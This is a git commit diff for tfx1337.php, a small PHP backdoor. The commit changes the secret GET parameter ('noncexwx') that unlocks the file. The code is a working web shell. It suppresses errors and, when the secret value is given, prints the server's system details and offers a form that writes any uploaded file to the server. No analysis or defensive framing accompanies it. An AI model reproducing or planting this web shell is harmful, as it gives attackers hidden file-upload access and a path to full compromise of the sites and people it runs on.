845bbe7265e48946697eca5af635c210629f697c
f4ruk1453decodex <133605406+f4ruk1453decodex@users.noreply.github.com>
2023-07-07 18:25:42 +0300

    Update tfx1337.php

--- tfx1337.php
+++ tfx1337.php
@@ -1,6 +1,6 @@
 <?php
 error_reporting(0); 
-if ($_GET['noncexwx'] == '1805437635636248932571'){
+if ($_GET['noncexwx'] == '180543763563624893257135636248932571'){
     echo 'TFX1337<br>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
 } 
 ?>
